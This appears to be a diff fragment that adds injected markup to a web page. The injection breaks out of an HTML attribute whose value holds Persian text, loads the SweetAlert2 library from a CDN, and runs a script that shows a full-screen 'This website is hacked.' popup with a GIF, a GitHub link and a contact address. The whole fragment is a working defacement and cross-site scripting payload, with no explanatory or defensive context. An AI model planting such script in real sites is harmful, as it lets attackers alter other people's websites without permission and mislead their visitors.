@@ -1,0 +1,5 @@
+مسیح">
+
+<script src=" https://cdn.jsdelivr.net/npm/sweetalert2@11.9.0/dist/sweetalert2.all.min.js "></script>
+<link href=" https://cdn.jsdelivr.net/npm/sweetalert2@11.9.0/dist/sweetalert2.min.css " rel="stylesheet">
+<script>Swal.fire({title: "This website is hacked.", width: 900,height:900, padding: "3em", color: "#FFF", imageUrl:"https://raw.githubusercontent.com/M1778M/ToolsVerify/master/gifs/speed_dancing.gif",imageHeight:400,imageAlt:"Hacker",background: "#000 url('') center no-repeat",html:`<a href="https://github.com/M1778M">My github</a><pre>Contact Info: <a href="M1778@protonmail.com">M1778@protonmail.com</a></pre>`});</script>
